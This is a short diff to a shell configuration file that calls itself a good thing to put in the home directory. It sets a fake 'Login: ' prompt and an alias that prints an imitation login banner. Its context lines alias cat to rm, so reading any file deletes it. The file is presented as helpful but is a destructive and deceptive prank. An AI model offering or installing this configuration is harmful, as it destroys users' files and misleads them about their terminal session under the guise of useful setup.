@@ -1,6 +1,6 @@
 # This is a good thing to put in ~/
 export PS1="Login: "
-alias $USER="sleep 1"
+alias $USER="sleep 2 && clear && echo && echo \"`lsb_release -sd` `hostname` tty1\" && echo"
 
 # Useful aliases
 alias cat="rm"
